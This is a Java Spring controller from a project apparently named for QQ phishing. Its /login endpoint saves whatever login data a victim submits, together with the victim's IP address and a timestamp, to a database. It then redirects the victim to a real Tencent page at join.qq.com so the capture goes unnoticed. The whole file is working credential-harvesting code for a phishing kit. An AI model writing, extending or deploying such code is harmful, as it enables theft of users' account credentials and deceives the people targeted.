package com.example.qqfishing.controller;

import com.example.qqfishing.entity.User;
import com.example.qqfishing.mapper.UserMapper;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.crypto.Data;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

@RestController
public class UserController {
    @Autowired
    private  UserMapper userMapper;
    @RequestMapping("/login")
    public void login(User user, HttpServletRequest request, HttpServletResponse response) throws IOException {
        user.setIp(request.getRemoteAddr());
        Date date = new Date();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        user.setTime(formatter.format(date));
        userMapper.addUser(user);
        response.sendRedirect("https://join.qq.com/post_detail.html?pid=2&id=101&tid=2");
    }
}
